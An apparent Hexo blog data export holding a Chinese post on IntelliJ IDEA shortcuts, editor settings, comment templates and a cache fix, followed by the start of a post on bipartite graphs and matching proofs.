**导入快捷键配置文件**\n\n快捷键配置文件通常在如下位置（可以有多个文件，且配置文件名字也无明显要求）\n```\nLinux：~/.IdeaIC2019.1/config/keymaps/\nWindows：C:\\Users\\Administrator/.IdeaIC2019.1/config/keymaps/\n```\n配置文件（[我的配置文件](../static/Vince-Style.xml)）复制到上述相应目录后，重新启动IDEA，在快捷键配置页面（File => Settings... => Keymap）下拉框中即会增加新导入的配置文件，选中即可使用\n\n3. **项目太大，文件列表太长怎么办**\n\n可以尝试以下两种方法\n\n1) 配置合并多个目录层级（同一级下没有兄弟文件的文件合并到父级显示）\n![MB19051801-3](../static/MB19051801-3.png)\n2) 配置显示范围组，将当前正在开发的模块文件都配置到显示组中，切换到该显示组时仅显示该组包含文件\n![MB19051801-4](../static/MB19051801-4.png)\n\n## 常见问题解决\n\n1. 新导入项目，依赖下载完毕，源码仍然报错（maven各种update、clean、compile之后仍然报错）\n   \n   可能是由于IDEA缓存了依赖未下载前的目录信息，执行更新即可(File => Invalidate Caches / Restart...)","source":"_posts/2019-05-18_idea_experience.md","raw":"---\ntitle: IDEA配置经验与问题解决\ndate: 2019-05-18 10:32:33\ntags: IDE\npermalink: idea-experience\nkeywords: idea, 快捷键, 配置\nrId: MB-19051801\n---\n\n##  快捷键偏好设置\n\n1. 查找(Keymap -> Main Menu -> Edit -> Find -> Find...) ：Ctrl + F    【速记：find】 \n2. 复制上一行到下一行(Keymap -> Edit Actions -> Duplicate Entire Lines) ： Ctrl + 向下箭头 \n3. 移动代码到上一行(Keymap -> Main Menu -> Code -> Move Statement Up) ： Alt + 向上箭头 \n4. 移动代码到下一行(Keymap -> Main Menu -> Code -> Move Statement Down) ： Alt + 向下箭头 \n5. 删除一行(Keymap -> Editor Actions -> Delete Line) ： Ctrl + D    【速记：delete】 \n6. 调出代码提示(Keymap -> Main Menu -> Code -> Completion -> Basic) ： Alt + / \n7. 自动补全返回变量(Keymap -> Main Menu -> Refactor -> Extract -> Variable...) ： Alt + Enter \n8. 显示代码在哪里被使用(Keymap -> Main Menu -> Edit -> Find -> Find Usages) ： Ctrl + U     【速记：Usage】 \n9. 代码格式化(Keymap -> Main Menu -> Code -> Reformat Code) ：Ctrl + Shift + F    【速记：format】 \n10. 重命名(Keymap -> Main Menu -> Refactor -> Rename...) ： Alt + Shift + R    【速记：refact】 \n11. 全局查找(Keymap -> Main Menu -> Edit -> Find -> Find in Path...)：Ctrl + P    【速记：path】 \n12. 返回或前进到上次光标所在处(Keymap -> Main Menu -> Navigate -> Back / Forward)：Alt + 向左箭头/向右箭头\n13. 显示层级关系(Keymap -> Main Menu -> Navigate -> Type Hierarchy)：Ctrl + H    【速记：hierarchy】 \n14. 定位到继承代码(Keymap -> Main Menu -> Navigate -> Implementation(s))：Ctrl + Alt + Button1 Click\n15. 定位到声明代码(Keymap -> Main Menu -> Navigate -> Declaration)：Ctrl + Button1 Click\n16. 删除Java文件不用的依赖(Keymap -> Main Menu -> Code -> Optimize Imports)：Ctrl + Shift + O\n17. 显示参数列表(Keymap  -> Main Menu -> View -> Parameter Info)：Alt + P    【速记：parameter】 \n\n18. 取消双击shift更改为其他键(双击shift -> Actions)：输入registry... >> 其后选择点击`registry...`项 >> 找到`ide.suppress.double.click.handler`键名，右边打勾禁止双击shift处理 >> close >> 设置新快捷键(File => Settings... -> Keymap -> Other -> Search Everywhere不是文件夹项)：Ctrl + W    【速记：watch或where】 \n\nCTRL为基础组合键，与ALT相关的组合键通常是代码修改的辅助有关\n\n## 其他偏好设置\n\n1. 鼠标悬浮方法上方显示文档(Editor -> General => Show quick documentation on mouse move) ：打勾 \n\n2. 自动为Java文件添加明确的导入依赖(Editor -> General -> Auto Import => Add unambiguous imports on the fly)：打勾\n\n3. 自动补全中显示字段名称提示(Editor -> General -> Code Completion => Parameter => Show parameter name hints on completion)：打勾\n\n4. 方法常量变量显示参数名称提示(Editor -> General -> Appearance => Show parameter name hints)：打勾 >> 点开右边Configure配置页面，Language选Java，Do not开头的取消打勾，Show开头的打勾\n\n5. 显示链式调用方法的参数提示(Editor -> General -> Appearance => Show chain call type hints)：打勾\n\n6. 自动提示中显示文档（与参数列表择一足矣）(Editor-> General -> Code Completion => Show the Documentation popup in 1000 ms)：打勾\n\n7. 代码字体大小调大到14(Editor -> Font -> Size)\n\n8. Idea插件：CodeGlance（缩略图）、Rainbow Brackets（彩色括号）\n\n9. 新项目默认编码设置(File => Other Settings => Settings for New Projects... -> Editor -> File Encodings => Global Encoding和Project Encoding)：UTF-8        [已创建的项目，在File => Project Structure...设置]\n\n10. 新项目默认JDK设置(File => Other Settings => Structure for New Projects... -> Project Settings -> Platform Settings)：点击加号添加jdk，其后 >>  设置版本(Project Settings -> Project => Project SDK)：选择环境及默认版本级别        [已创建的项目，在File => Project Structure...设置]\n\n11. 行代码显示最后提交信息[Other Settings -> Git ToolBox Global => General -> Show editor inline 'Blame']：打勾（需要Git ToolBox插件）\n\n12. 方法之间显示分割线[Editor -> General -> Appearance => Show method separator]：打勾\n\n13. 文件头注释模板：File Header(Editor -> File and Code Templates -> Includes -> File Header)\n\n    ```\n    /**\n     *\n     * @Author: Vince\n     * @Date: ${DATE} ${TIME}\n     */\n    ```\n\n14. 通过特殊字符触发的方法注释模板(Editor -> Live Templates)：右边加号新加一个Template Group与Live Template\n\n   ![MB19051801-1](../static/MB19051801-1.png)\n\n   Abbreviation框填入`*`，Expand with选择回车，TemplateText填入生成的字符串\n\n   ```\n   *\n    * \n   $PARAM$\n    * @return : $RETURN$\n    * @author : Vince\n    * @date : $DATE$ $TIME$\n    */\n   ```\n\n   字符串中包含`$PARAM$`、`$RETURN$`、`$DATE$`、`$TIME$`等变量，点击`Edit variables`编辑变量如下\n\n   ![MB19051801-2](../static/MB19051801-2.png)\n\n   其中PARAM使用groovy脚本添加参数\n\n   ```\n   groovyScript(\"def result=''; def params=\\\"${_1}\\\".replaceAll('[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]', '').split(',').toList(); for(i = 0; i < params.size(); i++) {result+=' * @param ' + params[i] + ((i < params.size() - 1) ? '\\\\n':'')}; return result\", methodParameters())\n   ```\n\n   \n\n## 操作教程\n\n1. **修改快捷键**\n\nFile => Settings... => Keymap页面中：搜索输入框用于输入匹配文字搜索，输入框右侧按钮用于输入快捷键搜索。修改快捷键时，点击修改项，悬浮框中可选择设置键盘快捷键触发、设置鼠标配合Ctrl等键触发、缩写触发\n\n2. **导入快捷键配置文件**\n\n快捷键配置文件通常在如下位置（可以有多个文件，且配置文件名字也无明显要求）\n```\nLinux：~/.IdeaIC2019.1/config/keymaps/\nWindows：C:\\Users\\Administrator/.IdeaIC2019.1/config/keymaps/\n```\n配置文件（[我的配置文件](../static/Vince-Style.xml)）复制到上述相应目录后，重新启动IDEA，在快捷键配置页面（File => Settings... => Keymap）下拉框中即会增加新导入的配置文件，选中即可使用\n\n3. **项目太大，文件列表太长怎么办**\n\n可以尝试以下两种方法\n\n1) 配置合并多个目录层级（同一级下没有兄弟文件的文件合并到父级显示）\n![MB19051801-3](../static/MB19051801-3.png)\n2) 配置显示范围组，将当前正在开发的模块文件都配置到显示组中，切换到该显示组时仅显示该组包含文件\n![MB19051801-4](../static/MB19051801-4.png)\n\n## 常见问题解决\n\n1. 新导入项目，依赖下载完毕，源码仍然报错（maven各种update、clean、compile之后仍然报错）\n   \n   可能是由于IDEA缓存了依赖未下载前的目录信息，执行更新即可(File => Invalidate Caches / Restart...)","slug":"idea-experience","published":1,"updated":"2020-02-11T08:59:29.374Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck6hqy6yk00014cukb3cf9t2n","content":"<h2 id=\"快捷键偏好设置\"><a href=\"#快捷键偏好设置\" class=\"headerlink\" title=\"快捷键偏好设置\"></a>快捷键偏好设置</h2><ol>\n<li><p>查找(Keymap -&gt; Main Menu -&gt; Edit -&gt; Find -&gt; Find…) ：Ctrl + F    【速记：find】 </p>\n</li>\n<li><p>复制上一行到下一行(Keymap -&gt; Edit Actions -&gt; Duplicate Entire Lines) ： Ctrl + 向下箭头 </p>\n</li>\n<li><p>移动代码到上一行(Keymap -&gt; Main Menu -&gt; Code -&gt; Move Statement Up) ： Alt + 向上箭头 </p>\n</li>\n<li><p>移动代码到下一行(Keymap -&gt; Main Menu -&gt; Code -&gt; Move Statement Down) ： Alt + 向下箭头 </p>\n</li>\n<li><p>删除一行(Keymap -&gt; Editor Actions -&gt; Delete Line) ： Ctrl + D    【速记：delete】 </p>\n</li>\n<li><p>调出代码提示(Keymap -&gt; Main Menu -&gt; Code -&gt; Completion -&gt; Basic) ： Alt + / </p>\n</li>\n<li><p>自动补全返回变量(Keymap -&gt; Main Menu -&gt; Refactor -&gt; Extract -&gt; Variable…) ： Alt + Enter </p>\n</li>\n<li><p>显示代码在哪里被使用(Keymap -&gt; Main Menu -&gt; Edit -&gt; Find -&gt; Find Usages) ： Ctrl + U     【速记：Usage】 </p>\n</li>\n<li><p>代码格式化(Keymap -&gt; Main Menu -&gt; Code -&gt; Reformat Code) ：Ctrl + Shift + F    【速记：format】 </p>\n</li>\n<li><p>重命名(Keymap -&gt; Main Menu -&gt; Refactor -&gt; Rename…) ： Alt + Shift + R    【速记：refact】 </p>\n</li>\n<li><p>全局查找(Keymap -&gt; Main Menu -&gt; Edit -&gt; Find -&gt; Find in Path…)：Ctrl + P    【速记：path】 </p>\n</li>\n<li><p>返回或前进到上次光标所在处(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Back / Forward)：Alt + 向左箭头/向右箭头</p>\n</li>\n<li><p>显示层级关系(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Type Hierarchy)：Ctrl + H    【速记：hierarchy】 </p>\n</li>\n<li><p>定位到继承代码(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Implementation(s))：Ctrl + Alt + Button1 Click</p>\n</li>\n<li><p>定位到声明代码(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Declaration)：Ctrl + Button1 Click</p>\n</li>\n<li><p>删除Java文件不用的依赖(Keymap -&gt; Main Menu -&gt; Code -&gt; Optimize Imports)：Ctrl + Shift + O</p>\n</li>\n<li><p>显示参数列表(Keymap  -&gt; Main Menu -&gt; View -&gt; Parameter Info)：Alt + P    【速记：parameter】 </p>\n</li>\n<li><p>取消双击shift更改为其他键(双击shift -&gt; Actions)：输入registry… &gt;&gt; 其后选择点击<code>registry...</code>项 &gt;&gt; 找到<code>ide.suppress.double.click.handler</code>键名，右边打勾禁止双击shift处理 &gt;&gt; close &gt;&gt; 设置新快捷键(File =&gt; Settings… -&gt; Keymap -&gt; Other -&gt; Search Everywhere不是文件夹项)：Ctrl + W    【速记：watch或where】 </p>\n</li>\n</ol>\n<p>CTRL为基础组合键，与ALT相关的组合键通常是代码修改的辅助有关</p>\n<h2 id=\"其他偏好设置\"><a href=\"#其他偏好设置\" class=\"headerlink\" title=\"其他偏好设置\"></a>其他偏好设置</h2><ol>\n<li><p>鼠标悬浮方法上方显示文档(Editor -&gt; General =&gt; Show quick documentation on mouse move) ：打勾 </p>\n</li>\n<li><p>自动为Java文件添加明确的导入依赖(Editor -&gt; General -&gt; Auto Import =&gt; Add unambiguous imports on the fly)：打勾</p>\n</li>\n<li><p>自动补全中显示字段名称提示(Editor -&gt; General -&gt; Code Completion =&gt; Parameter =&gt; Show parameter name hints on completion)：打勾</p>\n</li>\n<li><p>方法常量变量显示参数名称提示(Editor -&gt; General -&gt; Appearance =&gt; Show parameter name hints)：打勾 &gt;&gt; 点开右边Configure配置页面，Language选Java，Do not开头的取消打勾，Show开头的打勾</p>\n</li>\n<li><p>显示链式调用方法的参数提示(Editor -&gt; General -&gt; Appearance =&gt; Show chain call type hints)：打勾</p>\n</li>\n<li><p>自动提示中显示文档（与参数列表择一足矣）(Editor-&gt; General -&gt; Code Completion =&gt; Show the Documentation popup in 1000 ms)：打勾</p>\n</li>\n<li><p>代码字体大小调大到14(Editor -&gt; Font -&gt; Size)</p>\n</li>\n<li><p>Idea插件：CodeGlance（缩略图）、Rainbow Brackets（彩色括号）</p>\n</li>\n<li><p>新项目默认编码设置(File =&gt; Other Settings =&gt; Settings for New Projects… -&gt; Editor -&gt; File Encodings =&gt; Global Encoding和Project Encoding)：UTF-8        [已创建的项目，在File =&gt; Project Structure…设置]</p>\n</li>\n<li><p>新项目默认JDK设置(File =&gt; Other Settings =&gt; Structure for New Projects… -&gt; Project Settings -&gt; Platform Settings)：点击加号添加jdk，其后 &gt;&gt;  设置版本(Project Settings -&gt; Project =&gt; Project SDK)：选择环境及默认版本级别        [已创建的项目，在File =&gt; Project Structure…设置]</p>\n</li>\n<li><p>行代码显示最后提交信息[Other Settings -&gt; Git ToolBox Global =&gt; General -&gt; Show editor inline ‘Blame’]：打勾（需要Git ToolBox插件）</p>\n</li>\n<li><p>方法之间显示分割线[Editor -&gt; General -&gt; Appearance =&gt; Show method separator]：打勾</p>\n</li>\n<li><p>文件头注释模板：File Header(Editor -&gt; File and Code Templates -&gt; Includes -&gt; File Header)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @Author: Vince</span><br><span class=\"line\"> * @Date: $&#123;DATE&#125; $&#123;TIME&#125;</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>通过特殊字符触发的方法注释模板(Editor -&gt; Live Templates)：右边加号新加一个Template Group与Live Template</p>\n<p><img src=\"../static/MB19051801-1.png\" alt=\"MB19051801-1\"></p>\n<p>Abbreviation框填入<code>*</code>，Expand with选择回车，TemplateText填入生成的字符串</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*</span><br><span class=\"line\"> * </span><br><span class=\"line\">$PARAM$</span><br><span class=\"line\"> * @return : $RETURN$</span><br><span class=\"line\"> * @author : Vince</span><br><span class=\"line\"> * @date : $DATE$ $TIME$</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<p>字符串中包含<code>$PARAM$</code>、<code>$RETURN$</code>、<code>$DATE$</code>、<code>$TIME$</code>等变量，点击<code>Edit variables</code>编辑变量如下</p>\n<p><img src=\"../static/MB19051801-2.png\" alt=\"MB19051801-2\"></p>\n<p>其中PARAM使用groovy脚本添加参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">groovyScript(&quot;def result=&apos;&apos;; def params=\\&quot;$&#123;_1&#125;\\&quot;.replaceAll(&apos;[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]&apos;, &apos;&apos;).split(&apos;,&apos;).toList(); for(i = 0; i &lt; params.size(); i++) &#123;result+=&apos; * @param &apos; + params[i] + ((i &lt; params.size() - 1) ? &apos;\\\\n&apos;:&apos;&apos;)&#125;; return result&quot;, methodParameters())</span><br></pre></td></tr></table></figure>\n\n\n\n</li>\n</ol>\n<h2 id=\"操作教程\"><a href=\"#操作教程\" class=\"headerlink\" title=\"操作教程\"></a>操作教程</h2><ol>\n<li><strong>修改快捷键</strong></li>\n</ol>\n<p>File =&gt; Settings… =&gt; Keymap页面中：搜索输入框用于输入匹配文字搜索，输入框右侧按钮用于输入快捷键搜索。修改快捷键时，点击修改项，悬浮框中可选择设置键盘快捷键触发、设置鼠标配合Ctrl等键触发、缩写触发</p>\n<ol start=\"2\">\n<li><strong>导入快捷键配置文件</strong></li>\n</ol>\n<p>快捷键配置文件通常在如下位置（可以有多个文件，且配置文件名字也无明显要求）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux：~/.IdeaIC2019.1/config/keymaps/</span><br><span class=\"line\">Windows：C:\\Users\\Administrator/.IdeaIC2019.1/config/keymaps/</span><br></pre></td></tr></table></figure>\n\n<p>配置文件（<a href=\"../static/Vince-Style.xml\">我的配置文件</a>）复制到上述相应目录后，重新启动IDEA，在快捷键配置页面（File =&gt; Settings… =&gt; Keymap）下拉框中即会增加新导入的配置文件，选中即可使用</p>\n<ol start=\"3\">\n<li><strong>项目太大，文件列表太长怎么办</strong></li>\n</ol>\n<p>可以尝试以下两种方法</p>\n<p>1) 配置合并多个目录层级（同一级下没有兄弟文件的文件合并到父级显示）<br><img src=\"../static/MB19051801-3.png\" alt=\"MB19051801-3\"><br>2) 配置显示范围组，将当前正在开发的模块文件都配置到显示组中，切换到该显示组时仅显示该组包含文件<br><img src=\"../static/MB19051801-4.png\" alt=\"MB19051801-4\"></p>\n<h2 id=\"常见问题解决\"><a href=\"#常见问题解决\" class=\"headerlink\" title=\"常见问题解决\"></a>常见问题解决</h2><ol>\n<li><p>新导入项目，依赖下载完毕，源码仍然报错（maven各种update、clean、compile之后仍然报错）</p>\n<p>可能是由于IDEA缓存了依赖未下载前的目录信息，执行更新即可(File =&gt; Invalidate Caches / Restart…)</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"快捷键偏好设置\"><a href=\"#快捷键偏好设置\" class=\"headerlink\" title=\"快捷键偏好设置\"></a>快捷键偏好设置</h2><ol>\n<li><p>查找(Keymap -&gt; Main Menu -&gt; Edit -&gt; Find -&gt; Find…) ：Ctrl + F    【速记：find】 </p>\n</li>\n<li><p>复制上一行到下一行(Keymap -&gt; Edit Actions -&gt; Duplicate Entire Lines) ： Ctrl + 向下箭头 </p>\n</li>\n<li><p>移动代码到上一行(Keymap -&gt; Main Menu -&gt; Code -&gt; Move Statement Up) ： Alt + 向上箭头 </p>\n</li>\n<li><p>移动代码到下一行(Keymap -&gt; Main Menu -&gt; Code -&gt; Move Statement Down) ： Alt + 向下箭头 </p>\n</li>\n<li><p>删除一行(Keymap -&gt; Editor Actions -&gt; Delete Line) ： Ctrl + D    【速记：delete】 </p>\n</li>\n<li><p>调出代码提示(Keymap -&gt; Main Menu -&gt; Code -&gt; Completion -&gt; Basic) ： Alt + / </p>\n</li>\n<li><p>自动补全返回变量(Keymap -&gt; Main Menu -&gt; Refactor -&gt; Extract -&gt; Variable…) ： Alt + Enter </p>\n</li>\n<li><p>显示代码在哪里被使用(Keymap -&gt; Main Menu -&gt; Edit -&gt; Find -&gt; Find Usages) ： Ctrl + U     【速记：Usage】 </p>\n</li>\n<li><p>代码格式化(Keymap -&gt; Main Menu -&gt; Code -&gt; Reformat Code) ：Ctrl + Shift + F    【速记：format】 </p>\n</li>\n<li><p>重命名(Keymap -&gt; Main Menu -&gt; Refactor -&gt; Rename…) ： Alt + Shift + R    【速记：refact】 </p>\n</li>\n<li><p>全局查找(Keymap -&gt; Main Menu -&gt; Edit -&gt; Find -&gt; Find in Path…)：Ctrl + P    【速记：path】 </p>\n</li>\n<li><p>返回或前进到上次光标所在处(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Back / Forward)：Alt + 向左箭头/向右箭头</p>\n</li>\n<li><p>显示层级关系(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Type Hierarchy)：Ctrl + H    【速记：hierarchy】 </p>\n</li>\n<li><p>定位到继承代码(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Implementation(s))：Ctrl + Alt + Button1 Click</p>\n</li>\n<li><p>定位到声明代码(Keymap -&gt; Main Menu -&gt; Navigate -&gt; Declaration)：Ctrl + Button1 Click</p>\n</li>\n<li><p>删除Java文件不用的依赖(Keymap -&gt; Main Menu -&gt; Code -&gt; Optimize Imports)：Ctrl + Shift + O</p>\n</li>\n<li><p>显示参数列表(Keymap  -&gt; Main Menu -&gt; View -&gt; Parameter Info)：Alt + P    【速记：parameter】 </p>\n</li>\n<li><p>取消双击shift更改为其他键(双击shift -&gt; Actions)：输入registry… &gt;&gt; 其后选择点击<code>registry...</code>项 &gt;&gt; 找到<code>ide.suppress.double.click.handler</code>键名，右边打勾禁止双击shift处理 &gt;&gt; close &gt;&gt; 设置新快捷键(File =&gt; Settings… -&gt; Keymap -&gt; Other -&gt; Search Everywhere不是文件夹项)：Ctrl + W    【速记：watch或where】 </p>\n</li>\n</ol>\n<p>CTRL为基础组合键，与ALT相关的组合键通常是代码修改的辅助有关</p>\n<h2 id=\"其他偏好设置\"><a href=\"#其他偏好设置\" class=\"headerlink\" title=\"其他偏好设置\"></a>其他偏好设置</h2><ol>\n<li><p>鼠标悬浮方法上方显示文档(Editor -&gt; General =&gt; Show quick documentation on mouse move) ：打勾 </p>\n</li>\n<li><p>自动为Java文件添加明确的导入依赖(Editor -&gt; General -&gt; Auto Import =&gt; Add unambiguous imports on the fly)：打勾</p>\n</li>\n<li><p>自动补全中显示字段名称提示(Editor -&gt; General -&gt; Code Completion =&gt; Parameter =&gt; Show parameter name hints on completion)：打勾</p>\n</li>\n<li><p>方法常量变量显示参数名称提示(Editor -&gt; General -&gt; Appearance =&gt; Show parameter name hints)：打勾 &gt;&gt; 点开右边Configure配置页面，Language选Java，Do not开头的取消打勾，Show开头的打勾</p>\n</li>\n<li><p>显示链式调用方法的参数提示(Editor -&gt; General -&gt; Appearance =&gt; Show chain call type hints)：打勾</p>\n</li>\n<li><p>自动提示中显示文档（与参数列表择一足矣）(Editor-&gt; General -&gt; Code Completion =&gt; Show the Documentation popup in 1000 ms)：打勾</p>\n</li>\n<li><p>代码字体大小调大到14(Editor -&gt; Font -&gt; Size)</p>\n</li>\n<li><p>Idea插件：CodeGlance（缩略图）、Rainbow Brackets（彩色括号）</p>\n</li>\n<li><p>新项目默认编码设置(File =&gt; Other Settings =&gt; Settings for New Projects… -&gt; Editor -&gt; File Encodings =&gt; Global Encoding和Project Encoding)：UTF-8        [已创建的项目，在File =&gt; Project Structure…设置]</p>\n</li>\n<li><p>新项目默认JDK设置(File =&gt; Other Settings =&gt; Structure for New Projects… -&gt; Project Settings -&gt; Platform Settings)：点击加号添加jdk，其后 &gt;&gt;  设置版本(Project Settings -&gt; Project =&gt; Project SDK)：选择环境及默认版本级别        [已创建的项目，在File =&gt; Project Structure…设置]</p>\n</li>\n<li><p>行代码显示最后提交信息[Other Settings -&gt; Git ToolBox Global =&gt; General -&gt; Show editor inline ‘Blame’]：打勾（需要Git ToolBox插件）</p>\n</li>\n<li><p>方法之间显示分割线[Editor -&gt; General -&gt; Appearance =&gt; Show method separator]：打勾</p>\n</li>\n<li><p>文件头注释模板：File Header(Editor -&gt; File and Code Templates -&gt; Includes -&gt; File Header)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @Author: Vince</span><br><span class=\"line\"> * @Date: $&#123;DATE&#125; $&#123;TIME&#125;</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>通过特殊字符触发的方法注释模板(Editor -&gt; Live Templates)：右边加号新加一个Template Group与Live Template</p>\n<p><img src=\"../static/MB19051801-1.png\" alt=\"MB19051801-1\"></p>\n<p>Abbreviation框填入<code>*</code>，Expand with选择回车，TemplateText填入生成的字符串</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*</span><br><span class=\"line\"> * </span><br><span class=\"line\">$PARAM$</span><br><span class=\"line\"> * @return : $RETURN$</span><br><span class=\"line\"> * @author : Vince</span><br><span class=\"line\"> * @date : $DATE$ $TIME$</span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<p>字符串中包含<code>$PARAM$</code>、<code>$RETURN$</code>、<code>$DATE$</code>、<code>$TIME$</code>等变量，点击<code>Edit variables</code>编辑变量如下</p>\n<p><img src=\"../static/MB19051801-2.png\" alt=\"MB19051801-2\"></p>\n<p>其中PARAM使用groovy脚本添加参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">groovyScript(&quot;def result=&apos;&apos;; def params=\\&quot;$&#123;_1&#125;\\&quot;.replaceAll(&apos;[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]&apos;, &apos;&apos;).split(&apos;,&apos;).toList(); for(i = 0; i &lt; params.size(); i++) &#123;result+=&apos; * @param &apos; + params[i] + ((i &lt; params.size() - 1) ? &apos;\\\\n&apos;:&apos;&apos;)&#125;; return result&quot;, methodParameters())</span><br></pre></td></tr></table></figure>\n\n\n\n</li>\n</ol>\n<h2 id=\"操作教程\"><a href=\"#操作教程\" class=\"headerlink\" title=\"操作教程\"></a>操作教程</h2><ol>\n<li><strong>修改快捷键</strong></li>\n</ol>\n<p>File =&gt; Settings… =&gt; Keymap页面中：搜索输入框用于输入匹配文字搜索，输入框右侧按钮用于输入快捷键搜索。修改快捷键时，点击修改项，悬浮框中可选择设置键盘快捷键触发、设置鼠标配合Ctrl等键触发、缩写触发</p>\n<ol start=\"2\">\n<li><strong>导入快捷键配置文件</strong></li>\n</ol>\n<p>快捷键配置文件通常在如下位置（可以有多个文件，且配置文件名字也无明显要求）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux：~/.IdeaIC2019.1/config/keymaps/</span><br><span class=\"line\">Windows：C:\\Users\\Administrator/.IdeaIC2019.1/config/keymaps/</span><br></pre></td></tr></table></figure>\n\n<p>配置文件（<a href=\"../static/Vince-Style.xml\">我的配置文件</a>）复制到上述相应目录后，重新启动IDEA，在快捷键配置页面（File =&gt; Settings… =&gt; Keymap）下拉框中即会增加新导入的配置文件，选中即可使用</p>\n<ol start=\"3\">\n<li><strong>项目太大，文件列表太长怎么办</strong></li>\n</ol>\n<p>可以尝试以下两种方法</p>\n<p>1) 配置合并多个目录层级（同一级下没有兄弟文件的文件合并到父级显示）<br><img src=\"../static/MB19051801-3.png\" alt=\"MB19051801-3\"><br>2) 配置显示范围组，将当前正在开发的模块文件都配置到显示组中，切换到该显示组时仅显示该组包含文件<br><img src=\"../static/MB19051801-4.png\" alt=\"MB19051801-4\"></p>\n<h2 id=\"常见问题解决\"><a href=\"#常见问题解决\" class=\"headerlink\" title=\"常见问题解决\"></a>常见问题解决</h2><ol>\n<li><p>新导入项目，依赖下载完毕，源码仍然报错（maven各种update、clean、compile之后仍然报错）</p>\n<p>可能是由于IDEA缓存了依赖未下载前的目录信息，执行更新即可(File =&gt; Invalidate Caches / Restart…)</p>\n</li>\n</ol>\n"},{"title":"从二分图开始到最大匹配","date":"2020-02-23T06:22:00.000Z","keywords":"最小覆盖, 最大匹配, 最大独立集","rId":"MB-20022301","_content":"\n## 图论概念\n\n* 图：由顶点和顶点之间的边组成的集合，表示为G<V, E>，V表示的是顶点的集合，E表示的是边的集合\n* 独立集：图内点集的子集，且满足：每两个顶点之间均不存在连边\n* 最大独立集：图内顶点数量最多的独立集\n* 覆盖：图内点集的子集，且满足：能覆盖（顶点是边的任一个端点都视为覆盖边）图的所有边\n* 最小覆盖：图内顶点数量最少的覆盖\n* 最小覆盖数：最小覆盖的顶点数量\n* 匹配：图内边集的子集，且满足：任意两条边都没有公共顶点\n* 最大匹配：图内边数量最多的匹配\n* 最大匹配数：最大匹配的边数量\n\n## 二分图\n\n设G<V, E>是一个无向图，如果顶点V可分割为两个互不相交的子集(A, B)，并且图中每条边(i, j)的两个顶点分别属于两个不同的集合(i属于A, j属于B)，则程图G是二分图。\n\n定理和推论：\n\n1. 无向图G是二分图的充要条件是：G至少有两个顶点，且所有环的长度都为偶数\n2. 最大独立集顶点数量 = 图中顶点数量 - 最小点覆盖数\n3. 最小覆盖数 = 最大匹配数\n\n\n\n二分图充要条件证明见[百度百科](<https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE/9089095?fr=aladdin#3>)（以`边跨集合A和B，形成环必然需要一次往返的倍数`这个思路考虑）\n\n最大独立集顶点数量证明略（简单思考：去掉最小覆盖点，图中边自然也就不存在了）\n\n### 证明最小覆盖数等于最大匹配数\n\n条件：\n\n```\n图G<V,E>\n存在点集C是最小点覆盖，最小覆盖数为c\n存在边集M是最大匹配，最大匹配数为m\n```\n\n求证：m = c\n\n证明：\n\n> 1. 点集C是覆盖，则边集M上的任意一条边，至少有一端点属于C，所以m <= c  （光覆盖这些边就需要m个点）\n>\n> 2. 点集C是最小覆盖，则有如下两点结论：\n>\n>    ​    Ⅰ. 点集中每个点都**至少能找到一个**点集外的点与该点连边。如果没有，说明该点所有边端点都在覆盖中，那这个点也没必要包含了，与最小覆盖矛盾\n>    ​    Ⅱ. 点集中多个点**都只能**选择同一个点集外的点连边的情况也**不会出现**。如果出现，说明部分点不是必要的，就不是最小覆盖了。\n>\n>    上面两条保证了每个点都可以有一个覆盖外的点连边且这些连边不包含共同顶点，所以这些连边组成的边集是图G的一个匹配，所以m >= c\n>\n> 综上两点，m = c 得证\n\n## 